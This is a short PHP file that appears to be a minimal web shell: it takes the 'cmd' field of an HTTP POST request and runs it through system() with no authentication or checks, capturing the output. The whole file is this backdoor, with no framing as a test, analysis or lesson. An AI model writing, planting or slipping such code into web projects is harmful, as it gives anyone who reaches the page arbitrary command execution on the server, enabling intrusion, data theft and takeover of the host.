<?php
function myshellexec($cmd)
{ 
	system($cmd); 
	$result = @ob_get_contents(); 
	@ob_clean(); 
    return $result;
}

$cmdline = $_POST['cmd'];
$ret = myshellexec($cmdline);
?>